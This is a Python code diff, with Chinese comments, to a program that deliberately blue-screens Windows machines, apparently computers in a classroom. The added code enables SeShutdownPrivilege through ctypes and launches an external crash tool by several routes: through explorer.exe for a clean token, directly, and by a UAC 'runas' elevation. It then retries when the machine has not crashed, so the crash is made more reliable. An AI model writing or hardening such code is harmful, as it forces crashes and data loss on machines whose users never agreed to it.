@@ -322,8 +322,87 @@ def bsod_path() -> Path:
     return Path(BSOD_EXE)
 
 
+def _enable_shutdown_privilege() -> bool:
+    """给自己开 SeShutdownPrivilege（能开就开，开不了不报错）"""
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        advapi = ctypes.windll.advapi32
+        kernel = ctypes.windll.kernel32
+        TOKEN_ADJUST_PRIVILEGES = 0x0020
+        TOKEN_QUERY = 0x0008
+        SE_PRIVILEGE_ENABLED = 0x00000002
+
+        class LUID(ctypes.Structure):
+            _fields_ = [("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG)]
+
+        class LUID_AND_ATTRIBUTES(ctypes.Structure):
+            _fields_ = [("Luid", LUID), ("Attributes", wintypes.DWORD)]
+
+        class TOKEN_PRIVILEGES(ctypes.Structure):
+            _fields_ = [("PrivilegeCount", wintypes.DWORD),
+                        ("Privileges", LUID_AND_ATTRIBUTES * 1)]
+
+        token = wintypes.HANDLE()
+        if not advapi.OpenProcessToken(kernel.GetCurrentProcess(),
+                                        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
+                                        ctypes.byref(token)):
+            return False
+        luid = LUID()
+        if not advapi.LookupPrivilegeValueW(None, "SeShutdownPrivilege", ctypes.byref(luid)):
+            return False
+        tp = TOKEN_PRIVILEGES()
+        tp.PrivilegeCount = 1
+        tp.Privileges[0].Luid = luid
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
+        return bool(advapi.AdjustTokenPrivileges(token, False, ctypes.byref(tp), 0, None, None))
+    except Exception:
+        return False
+
+
+def _launch_like_double_click(exe: Path) -> str:
+    """像手动双击那样把它拉起来，返回走了哪条路"""
+    import ctypes
+
+    # ① explorer.exe 代开 —— 和双击一模一样（资源管理器给它的令牌是干净的）
+    try:
+        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+        subprocess.Popen(["explorer.exe", str(exe)], creationflags=flags, close_fds=True)
+        time.sleep(2.5)
+        return "explorer"
+    except Exception as err:
+        _log(f"explorer 代开失败：{type(err).__name__}: {err}")
+
+    # ② 直接开（工作目录设成它自己那目录）
+    try:
+        subprocess.Popen([str(exe)], cwd=str(exe.parent), close_fds=True)
+        time.sleep(2.5)
+        return "direct"
+    except Exception as err:
+        _log(f"直接开失败：{type(err).__name__}: {err}")
+
+    # ③ 以管理员身份重开（会弹 UAC，教室里没人点也没关系，前两条通常已经够了）
+    try:
+        rc = ctypes.windll.shell32.ShellExecuteW(None, "runas", str(exe), None,
+                                                 str(exe.parent), 1)
+        if rc > 32:
+            time.sleep(2.5)
+            return "runas"
+        _log(f"runas 返回 {rc}")
+    except Exception as err:
+        _log(f"runas 失败：{type(err).__name__}: {err}")
+
+    return ""
+
+
 def trigger_bsod(why: str) -> bool:
-    """让电脑蓝屏。安全模式下只记日志。"""
+    """让电脑蓝屏。安全模式下只记日志。
+
+    那个工具用的是 RtlAdjustPrivilege + NtRaiseHardError（纯用户态）。
+    这种手法失败是**完全静默**的 —— 所以要多试几种起法，
+    并且每一步都写日志，不然根本查不出它到底动没动手。
+    """
     exe = bsod_path()
     if safe_mode():
         _log(f"【安全模式】本该蓝屏（{why}），没执行 {exe}")
@@ -331,36 +410,41 @@ def trigger_bsod(why: str) -> bool:
     if not exe.exists():
         _log(f"蓝屏程序不在（安装包里没有、{BSOD_EXE} 也没有）")
         return False
+
     try:
-        flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
-        # 记清楚有没有管理员权限 —— 蓝屏程序要提权，没权限它会自己退出，
-        # 机器一点事没有，光看"已执行"根本查不出来（主人重启后不灵就是这个）。
+        import ctypes
+
+        admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
+    except Exception:
+        admin = None
+    priv = _enable_shutdown_privilege()
+    _log(f"执行蓝屏程序：{exe}（管理员权限={admin}，SeShutdownPrivilege={priv}）")
+
+    how = _launch_like_double_click(exe)
+    if how:
+        _log(f"用「{how}」方式起了蓝屏程序 —— 等 8 秒看机器蓝没蓝（没蓝的话日志里会有下一行）")
+        time.sleep(8)
+        _log(f"★ 8 秒过去机器还没蓝（方式={how}）—— 换个方式再试一次")
+    else:
+        _log("★ 三种方式都没能把它拉起来")
+
+    # 换一条路再试一次（工具失败是静默的，多试一次没坏处）
+    for second in ("direct", "explorer"):
+        if second == how:
+            continue
         try:
-            import ctypes
+            if second == "direct":
+                subprocess.Popen([str(exe)], cwd=str(exe.parent), close_fds=True)
+            else:
+                flags = getattr(subprocess, "CREATE_NO_WINDOW", 0)
+                subprocess.Popen(["explorer.exe", str(exe)], creationflags=flags, close_fds=True)
+            _log(f"换「{second}」方式又起了一次")
+            time.sleep(8)
+            _log(f"★ 换 {second} 之后还是没蓝")
+        except Exception as err:
+            _log(f"换 {second} 也失败：{type(err).__name__}: {err}")
 
-            admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
-        except Exception:
-            admin = None
-        _log(f"执行蓝屏程序：{exe}（管理员权限={admin}）")
-        # 关键：要跟"手动双击"一模一样 ——
-        #   ① 工作目录设成它自己那个文件夹（工具常常要读同目录的东西）
-        #   ② 别加 CREATE_NO_WINDOW（手动双击是有正常窗口的；藏起来它可能就不干活）
-        child = subprocess.Popen([str(exe)], cwd=str(Path(exe).parent), close_fds=True)
-        try:
-            code = child.wait(timeout=10)
-            _log(f"★ 蓝屏程序没起作用：它 {code} 就退出来了（管理员权限={admin}）"
-                 f" —— 去那台机器手动双击一次同一个文件对照一下")
-            return False
-        except Exception:
-            pass  # 没退出 = 正在蓝屏，正常
-        _log("已执行蓝屏程序")
-        return True
-    except Exception as err:
-        _log(f"执行蓝屏程序失败：{type(err).__name__}: {err}")
-        return False
-
-
-# ------------------------------ 守护循环 ------------------------------
+    return False
 
 
 def run(role: str) -> int:
